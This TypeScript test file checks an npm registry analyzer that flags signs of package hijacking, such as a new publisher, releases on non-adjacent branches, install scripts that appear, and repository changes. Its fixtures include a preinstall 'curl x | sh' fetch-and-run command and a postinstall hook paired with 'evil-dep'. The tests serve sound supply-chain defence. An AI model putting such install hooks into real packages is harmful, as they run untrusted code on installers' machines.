import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { STAGE2_PARAMS as P } from '../src/stage2/params.ts';
import { analyzeRegistry, githubRepo, hasLineGap, trustedConfig } from '../src/stage2/registry.ts';
import type { NpmPerson, Packument, VersionManifest } from '../src/stage2/types.ts';

interface V {
  v: string;
  t: string;
  user?: NpmPerson;
  removed?: boolean;
  m?: Partial<VersionManifest>;
}

const human = (name: string, email = `${name}@example.org`): NpmPerson => ({ name, email });
const ci = (config: string): NpmPerson => ({ name: 'GitHub Actions', email: 'npm-oidc-no-reply@github.com', trustedPublisher: { id: 'github', oidcConfigId: config } });

function pack(list: V[], extra: Partial<Packument> = {}): Packument {
  const versions: Record<string, VersionManifest> = {};
  const time: Record<string, string> = { created: list[0]!.t, modified: list.at(-1)!.t };
  for (const x of list) {
    time[x.v] = x.t;
    if (!x.removed) versions[x.v] = { version: x.v, _npmUser: x.user ?? human('owner'), maintainers: [human('owner')], dist: { unpackedSize: 40_000, fileCount: 10 }, ...x.m };
  }
  return { name: 'pkg', 'dist-tags': { latest: list.at(-1)!.v }, versions, time, maintainers: [human('owner')], ...extra };
}

const at = (iso: string) => {
  const t = Date.parse(iso);
  return { from: t - 5000, to: t + 5000 };
};
const ids = (r: { features: { id: string }[] }) => r.features.map((f) => f.id).sort();

// node-ipc history in broad strokes: one publisher for years, then three versions within a
// minute into the 9.1, 9.2 and 12 lines from an unknown account.
const ipcHistory: V[] = [
  { v: '9.0.0', t: '2017-01-10T00:00:00Z' },
  { v: '9.1.0', t: '2017-06-10T00:00:00Z' },
  { v: '9.1.5', t: '2019-03-10T00:00:00Z' },
  { v: '9.2.1', t: '2021-03-10T00:00:00Z' },
  { v: '10.0.0', t: '2021-06-10T00:00:00Z' },
  { v: '11.0.0', t: '2022-06-10T00:00:00Z' },
  { v: '11.1.0', t: '2023-01-10T00:00:00Z' },
  { v: '12.0.0', t: '2024-08-12T16:28:35Z' },
];
const attacker = human('mallory', 'mallory@fresh-domain.dev');

describe('analyzeRegistry', () => {
  it('node-ipc: new publisher, non-adjacent branches, wake-up after a pause', () => {
    const p = pack([
      ...ipcHistory,
      { v: '12.0.1', t: '2026-05-14T14:25:30Z', user: attacker },
      { v: '9.2.3', t: '2026-05-14T14:26:01Z', user: attacker },
      { v: '9.1.6', t: '2026-05-14T14:26:25Z', user: attacker },
    ]);
    const r = analyzeRegistry(p, at('2026-05-14T14:25:30Z'), P);
    assert.equal(r.kind, 'publish');
    assert.deepEqual(r.versions, ['12.0.1']);
    assert.deepEqual(ids(r), ['dormant_release', 'non_adjacent_branches', 'publisher_new']);
    const branches = r.features.find((f) => f.id === 'non_adjacent_branches')!;
    assert.deepEqual(branches.detail?.lines, ['9', '12']);
  });

  it('node-ipc, third event of the wave: the baseline is the package before the burst, not the two versions just published', () => {
    const p = pack([
      ...ipcHistory,
      { v: '12.0.1', t: '2026-05-14T14:25:30Z', user: attacker },
      { v: '9.2.3', t: '2026-05-14T14:26:01Z', user: attacker },
      { v: '9.1.6', t: '2026-05-14T14:26:25Z', user: attacker },
    ]);
    // the span of the third event starts after the second one
    const r = analyzeRegistry(p, { from: Date.parse('2026-05-14T14:26:02Z'), to: Date.parse('2026-05-14T14:26:35Z') }, P);
    assert.deepEqual(r.versions, ['9.1.6']);
    assert.deepEqual(ids(r), ['dormant_release', 'non_adjacent_branches', 'publisher_new']);
  });

  it('node-ipc after the fact: versions purged, but their times remain in time', () => {
    const p = pack([
      ...ipcHistory,
      { v: '12.0.1', t: '2026-05-14T14:25:30Z', removed: true },
      { v: '9.2.3', t: '2026-05-14T14:26:01Z', removed: true },
      { v: '9.1.6', t: '2026-05-14T14:26:25Z', removed: true },
    ]);
    const r = analyzeRegistry(p, at('2026-05-14T14:25:30Z'), P);
    assert.deepEqual(r.versions, []);
    assert.deepEqual(ids(r), ['dormant_release', 'non_adjacent_branches', 'version_removed']);
  });

  it('trusted publishing: two config id formats are not a change; a person after CI is', () => {
    const history: V[] = [
      { v: '5.0.0', t: '2025-01-01T00:00:00Z', user: human('tanner') },
      { v: '5.1.0', t: '2025-02-01T00:00:00Z', user: human('tanner') },
      { v: '5.2.0', t: '2025-03-01T00:00:00Z', user: ci('oidc:f154') },
      { v: '5.3.0', t: '2025-04-01T00:00:00Z', user: ci('oidc:f154') },
      { v: '5.4.0', t: '2025-05-01T00:00:00Z', user: ci('f154') },
    ];
    const sameCi = analyzeRegistry(pack([...history, { v: '5.5.0', t: '2025-06-01T00:00:00Z', user: ci('f154') }]), at('2025-06-01T00:00:00Z'), P);
    assert.deepEqual(ids(sameCi), []);

    const otherCi = analyzeRegistry(pack([...history, { v: '5.5.0', t: '2025-06-01T00:00:00Z', user: ci('oidc:9999') }]), at('2025-06-01T00:00:00Z'), P);
    assert.deepEqual(ids(otherCi), ['trusted_config_changed']);

    // the last five versions came only from CI, then a publication by a person (a former publisher)
    const ciOnly: V[] = [...history, { v: '5.4.1', t: '2025-05-02T00:00:00Z', user: ci('f154') }, { v: '5.4.2', t: '2025-05-03T00:00:00Z', user: ci('oidc:f154') }];
    const token = analyzeRegistry(pack([...ciOnly, { v: '5.5.0', t: '2025-06-01T00:00:00Z', user: human('tanner') }]), at('2025-06-01T00:00:00Z'), P);
    assert.ok(ids(token).includes('publisher_from_trusted'), ids(token).join());
    assert.equal(trustedConfig(ci('oidc:abc')), 'abc');
  });

  it('manifest: postinstall appeared, size jump, new dependency', () => {
    const p = pack([
      { v: '1.0.0', t: '2024-01-01T00:00:00Z' },
      { v: '1.0.1', t: '2024-02-01T00:00:00Z' },
      { v: '1.0.2', t: '2024-03-01T00:00:00Z', m: { dependencies: { a: '^1' } } },
      { v: '1.0.3', t: '2024-04-01T00:00:00Z', m: { dependencies: { a: '^1', 'evil-dep': '1.0.0' }, scripts: { postinstall: 'node bundle.js', test: 'x' }, dist: { unpackedSize: 3_200_000, fileCount: 12 } } },
    ]);
    const r = analyzeRegistry(p, at('2024-04-01T00:00:00Z'), P);
    assert.deepEqual(ids(r), ['deps_added', 'install_script_added', 'size_jump']);
    assert.deepEqual(r.features.find((f) => f.id === 'install_script_added')!.detail?.commands, { postinstall: 'node bundle.js' });
    const ev = r.evidence.versions as { lifecycle: Record<string, string> }[];
    assert.deepEqual(ev[0]!.lifecycle, { postinstall: 'node bundle.js' });
  });

  it('new package with an install script; no publisher check without history', () => {
    const r = analyzeRegistry(pack([{ v: '0.0.1', t: '2026-10-14T10:00:00Z', m: { scripts: { preinstall: 'curl x | sh' } } }]), at('2026-10-14T10:00:00Z'), P);
    assert.deepEqual(ids(r), ['install_script_new_package']);
    assert.equal(r.hasHistory, false);
  });

  it('event without new versions is metadata: a maintainer was added (packages with a history only)', () => {
    const history: V[] = [
      { v: '1.0.0', t: '2024-01-01T00:00:00Z' },
      { v: '1.0.1', t: '2024-02-01T00:00:00Z' },
      { v: '1.0.2', t: '2024-03-01T00:00:00Z' },
    ];
    const p = pack(history, { maintainers: [human('owner'), human('newcomer')] });
    const r = analyzeRegistry(p, at('2026-10-14T10:00:00Z'), P);
    assert.equal(r.kind, 'metadata');
    assert.deepEqual(r.features.map((f) => [f.id, f.value]), [['maintainers_added', ['newcomer']]]);
    // a young package republishing a pre-release tag must not fire on every document change
    const young = analyzeRegistry(pack(history.slice(0, 1), { maintainers: [human('owner'), human('newcomer')] }), at('2026-10-14T10:00:00Z'), P);
    assert.deepEqual(young.features, []);
  });

  it('the package is gone from the registry', () => {
    const r = analyzeRegistry(null, at('2026-10-14T10:00:00Z'), P);
    assert.equal(r.kind, 'package_missing');
    assert.deepEqual(ids(r), ['package_missing']);
  });

  it('repository change and a dropped gitHead', () => {
    const base = { repository: { type: 'git', url: 'git+https://github.com/Owner/Lib.git' }, gitHead: 'abc' };
    const p = pack([
      { v: '1.0.0', t: '2024-01-01T00:00:00Z', m: base },
      { v: '1.0.1', t: '2024-02-01T00:00:00Z', m: base },
      { v: '1.0.2', t: '2024-03-01T00:00:00Z', m: base },
      { v: '1.0.3', t: '2024-04-01T00:00:00Z', m: { repository: 'github:someone-else/lib' } },
    ]);
    const r = analyzeRegistry(p, at('2024-04-01T00:00:00Z'), P);
    assert.deepEqual(ids(r), ['git_head_dropped', 'repo_changed']);
    assert.deepEqual(r.repo, { owner: 'someone-else', name: 'lib' });
  });

  it('major jump of a mature package; calendar versions are not counted', () => {
    const hist: V[] = Array.from({ length: 10 }, (_, i) => ({ v: `1.${i}.0`, t: `2020-0${(i % 9) + 1}-01T00:00:00Z` }));
    hist.sort((a, b) => a.t.localeCompare(b.t));
    const jump = analyzeRegistry(pack([...hist, { v: '7.0.0', t: '2021-01-01T00:00:00Z' }]), at('2021-01-01T00:00:00Z'), P);
    assert.ok(ids(jump).includes('major_jump'));
    const cal = Array.from({ length: 10 }, (_, i) => ({ v: `2024.${i}.0`, t: `2024-0${(i % 9) + 1}-01T00:00:00Z` }));
    cal.sort((a, b) => a.t.localeCompare(b.t));
    const calJump = analyzeRegistry(pack([...cal, { v: '2026.1.0', t: '2025-01-01T00:00:00Z' }]), at('2025-01-01T00:00:00Z'), P);
    assert.ok(!ids(calJump).includes('major_jump'));
  });

  it('patches of adjacent branches (4.x and 5.x) are multi_branch, not non-adjacent', () => {
    const p = pack([
      { v: '4.21.0', t: '2025-01-01T00:00:00Z' },
      { v: '5.0.0', t: '2025-02-01T00:00:00Z' },
      { v: '5.1.0', t: '2025-03-01T00:00:00Z' },
      { v: '4.21.1', t: '2025-04-01T00:00:00Z' },
      { v: '5.1.1', t: '2025-04-01T00:01:00Z' },
    ]);
    const r = analyzeRegistry(p, at('2025-04-01T00:01:00Z'), P);
    assert.deepEqual(ids(r), ['multi_branch']);
  });

  it('a publisher returning after a long break', () => {
    const p = pack([
      { v: '1.0.0', t: '2019-01-01T00:00:00Z', user: human('alice') },
      { v: '1.1.0', t: '2019-06-01T00:00:00Z', user: human('alice') },
      { v: '2.0.0', t: '2021-01-01T00:00:00Z', user: human('bob') },
      { v: '2.1.0', t: '2025-01-01T00:00:00Z', user: human('bob') },
      { v: '2.2.0', t: '2025-06-01T00:00:00Z', user: human('alice') },
    ]);
    const r = analyzeRegistry(p, at('2025-06-01T00:00:00Z'), P);
    assert.deepEqual(ids(r), ['publisher_returned']);
  });
});

describe('helpers', () => {
  it('githubRepo understands the various forms', () => {
    assert.deepEqual(githubRepo('git+https://github.com/RIAEvangelist/node-ipc.git'), { owner: 'riaevangelist', name: 'node-ipc' });
    assert.deepEqual(githubRepo({ url: 'git@github.com:a/b.git' }), { owner: 'a', name: 'b' });
    assert.deepEqual(githubRepo('a/b'), { owner: 'a', name: 'b' });
    assert.deepEqual(githubRepo('https://github.com/a/b/tree/main/packages/c'), { owner: 'a', name: 'b' });
    assert.equal(githubRepo('https://gitlab.com/a/b'), null);
  });

  it('hasLineGap', () => {
    assert.deepEqual(hasLineGap(['9.1.6', '9.2.3', '12.0.1']), { lines: ['9', '12'], gap: true });
    assert.deepEqual(hasLineGap(['4.21.1', '5.1.1']), { lines: ['4', '5'], gap: false });
    assert.deepEqual(hasLineGap(['0.3.1', '0.5.0']), { lines: ['0.3', '0.5'], gap: true });
    assert.deepEqual(hasLineGap(['1.0.0-beta.1', '1.0.0']), { lines: ['1'], gap: false });
    // npm staged publishing: the 0.0.0-stage placeholder is not a release line
    assert.deepEqual(hasLineGap(['0.0.0-stage', '0.4.0', '0.4.1']), { lines: ['0.4'], gap: false });
    assert.deepEqual(hasLineGap(['0.0.0-stage', '0.0.1', '0.2.0']), { lines: ['0.2'], gap: false });
    assert.deepEqual(hasLineGap(['0.0.0-stage', '1.0.0', '0.4.2']), { lines: ['0.4', '1'], gap: false });
  });
});
